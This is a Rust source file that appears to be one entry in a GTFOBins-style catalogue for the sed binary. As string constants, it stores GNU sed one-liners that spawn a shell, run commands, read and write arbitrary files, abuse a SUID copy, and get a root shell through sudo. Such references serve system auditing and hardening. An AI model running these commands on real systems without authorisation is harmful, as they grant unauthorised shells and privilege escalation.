pub static BIN_NAME: &'static str = "sed";
pub static SH_DESC_1: &'static str = "GNU version only. Also, this requires `bash`.";
pub static SH_CODE_1: &'static str = r#"
    
    sed -n '1e exec sh 1>&0' /etc/hosts
"#;
pub static SH_DESC_2: &'static str =
    "GNU version only. The resulting shell is not a proper TTY shell.";
pub static SH_CODE_2: &'static str = r#"
    
    sed e
"#;
pub static CMD_DESC: &'static str = "GNU version only.";
pub static CMD_CODE: &'static str = r#"
    
    sed -n '1e id' /etc/hosts
"#;
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    sed -n "1s/.*/DATA/w $LFILE" /etc/hosts
"#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sed '' "$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which sed) .

    LFILE=file_to_read
    ./sed -e '' "$LFILE"
"#;
pub static SUDO_DESC: &'static str = "GNU version only. Also, this requires `bash`.";
pub static SUDO_CODE: &'static str = r#"
    
    sudo sed -n '1e exec sh 1>&0' /etc/hosts
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static CMD: Code<'static> = Code {
    title: "CMD_CODE",
    code: CMD_CODE,
    tag: Tag::CMD,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
